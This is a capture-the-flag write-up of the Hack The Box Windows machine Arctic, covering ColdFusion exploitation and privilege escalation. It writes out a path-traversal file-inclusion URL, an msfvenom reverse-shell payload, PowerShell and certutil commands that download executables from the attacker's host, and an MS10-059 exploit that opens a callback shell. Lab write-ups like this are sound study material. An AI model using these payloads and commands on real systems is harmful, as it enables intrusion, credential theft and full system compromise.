# Hack The Box — Arctic

**Machine:** Arctic
**Difficulty:** Easy
**OS:** Windows
**IP:** `10.129.78.79`

---

## Overview

Arctic is an Easy-rated Windows machine that demonstrates a straightforward but interesting attack chain involving **JRun/ColdFusion**, **Local File Inclusion (LFI)**, credential extraction, **Remote Code Execution (RCE)**, and finally **Windows privilege escalation**.

The initial enumeration revealed a JRun Web Server running on port `8500`. Further investigation identified ColdFusion and an LFI vulnerability that allowed access to the `password.properties` file. After cracking the retrieved password, the ColdFusion installation could be exploited for remote command execution.

The final privilege escalation was performed using **MS10-059**, resulting in a shell as `NT AUTHORITY\SYSTEM`.

---

# 1. Reconnaissance

We start with a basic Nmap scan.

```bash
nmap 10.129.78.79
```

### Results

```text
PORT      STATE SERVICE
135/tcp   open  msrpc
8500/tcp  open  fmtp
49154/tcp open  unknown
```

Only a few ports were discovered in the initial scan.

Since there could be additional services running on higher ports, an all-port scan was started in parallel.

---

# 2. Service Enumeration

Next, we perform service and version detection.

```bash
nmap -sC -sV 10.129.78.79
```

The interesting result was:

```text
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  http    JRun Web Server
49154/tcp open  msrpc   Microsoft Windows RPC

Service Info: OS: Windows
```

Port `8500` immediately stood out because it was running a **JRun Web Server**.

---

# 3. Configure Hosts File

To make enumeration easier, we add the target to `/etc/hosts`.

```bash
sudo nano /etc/hosts
```

Add:

```text
10.129.78.79 arctic.htb
```

Now we can access the target using:

```text
http://arctic.htb:8500
```

---

# 4. Web Enumeration

Visiting the web server revealed directory listings.

Further research into the JRun/ColdFusion environment showed that JRun was associated with older Adobe ColdFusion deployments.

The ColdFusion administrator interface was also exposed.

The important path was:

```text
/CFIDE/administrator/
```

At this point, we started investigating known vulnerabilities affecting older ColdFusion versions.

---

# 5. Local File Inclusion

A known ColdFusion LFI vulnerability was identified through Exploit-DB:

[Exploit-DB — ColdFusion LFI 14641](https://www.exploit-db.com/exploits/14641?utm_source=chatgpt.com)

The vulnerable functionality could be used to retrieve files from the server.

We targeted the ColdFusion password properties file:

```text
http://arctic.htb:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
```

The response revealed:

```text
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
```

This confirmed that the LFI was working and allowed us to retrieve sensitive ColdFusion configuration information.

---

# 6. Crack the Password

The retrieved password hash/value was submitted to CrackStation.

The password was recovered as:

```text
happyday
```

At this point, we had confirmed the ColdFusion version/environment and had credentials that could be used for the next stage.

---

# 7. Remote Code Execution

With the ColdFusion installation identified, we moved on to a known RCE exploit.

Exploit-DB:

[Exploit-DB — ColdFusion RCE 50057](https://www.exploit-db.com/exploits/50057?utm_source=chatgpt.com)

Using the exploit resulted in command execution on the target.

We confirmed access with:

```cmd
whoami
```

Output:

```text
arctic\tolis
```

We now had command execution as the user:

```text
arctic\tolis
```

The user flag was accessible from this context.

---

# 8. Preparing for Privilege Escalation

The next objective was to escalate from the compromised user to `NT AUTHORITY\SYSTEM`.

We generated a Windows reverse-shell payload:

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
LHOST=10.10.15.95 \
LPORT=4444 \
-f exe > rev.exe
```

The payload was created successfully.

However, when attempting to start a handler on port `4444`, Metasploit reported:

```text
Handler failed to bind to 10.10.15.95:4444
Handler failed to bind to 0.0.0.0:4444
Rex::BindFailed
```

The port was already in use, so another port was selected.

---

# 9. Transfer Files to the Target

The target could download files from our machine using PowerShell.

For example:

```cmd
powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.15.95:8000/1rev.exe','1rev.exe')"
```

An alternative transfer method using `certutil` can also be used:

```cmd
certutil.exe -urlcache -split -f "http://10.10.15.95:8000/MS10-059.exe" MS10-059.exe
```

---

# 10. MS10-059 Privilege Escalation

For the privilege escalation stage, we used the **MS10-059** Windows kernel exploit.

Reference:

[SecWiki — Windows Kernel Exploits / MS10-059](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059?utm_source=chatgpt.com)

After transferring the exploit to the target, we executed:

```cmd
MS10-059.exe 10.10.15.95 7777
```

On our attacking machine, we started a listener:

```bash
rlwrap nc -lvnp 7777
```

A connection was received:

```text
Listening on 0.0.0.0 7777
Connection received on 10.129.78.79 49419
```

We now had a Windows command shell.

---

# 11. Verify Privileges

Initially, I tried:

```cmd
getuid
```

but this is a Meterpreter command and therefore was not available in the normal Windows command shell.

Instead, we used:

```cmd
whoami
```

The result:

```text
nt authority\system
```

This confirmed successful privilege escalation.

We had achieved:

```text
arctic\tolis
        ↓
NT AUTHORITY\SYSTEM
```

---

# 12. Root Flag

With SYSTEM privileges, we navigated to the Administrator desktop:

```cmd
cd C:\Users\Administrator\Desktop
```

Then:

```cmd
type root.txt
```

The root flag was successfully retrieved.

---

# Attack Path

```text
Nmap
  ↓
Port 8500
  ↓
JRun Web Server
  ↓
ColdFusion
  ↓
LFI
  ↓
password.properties
  ↓
Password: happyday
  ↓
ColdFusion RCE
  ↓
arctic\tolis
  ↓
MS10-059
  ↓
NT AUTHORITY\SYSTEM
  ↓
root.txt
```

---

# Key Takeaways

* Always investigate unusual HTTP ports such as `8500`.
* Identify the underlying application rather than relying only on the reported service name.
* Old ColdFusion installations can expose sensitive configuration files.
* LFI can sometimes provide credentials or secrets that lead directly to further exploitation.
* Successful RCE does not necessarily mean full system compromise.
* Windows privilege escalation requires careful enumeration of the target OS and available vulnerabilities.
* Always verify your privilege level with `whoami` after exploitation.

---

## Tools Used

* Nmap
* Browser / Web Enumeration
* Exploit-DB
* CrackStation
* Metasploit
* msfvenom
* PowerShell
* Certutil
* Netcat
* MS10-059

---

## Conclusion

Arctic was a great example of how a relatively small attack surface can still expose a complete compromise path.

The machine started with only a few open ports, but the JRun service on port `8500` led to ColdFusion enumeration, LFI, credential extraction, RCE, and ultimately a Windows kernel privilege escalation to `NT AUTHORITY\SYSTEM`.

The main lesson is that **service identification and version-specific vulnerability research can be just as important as broad port enumeration**.
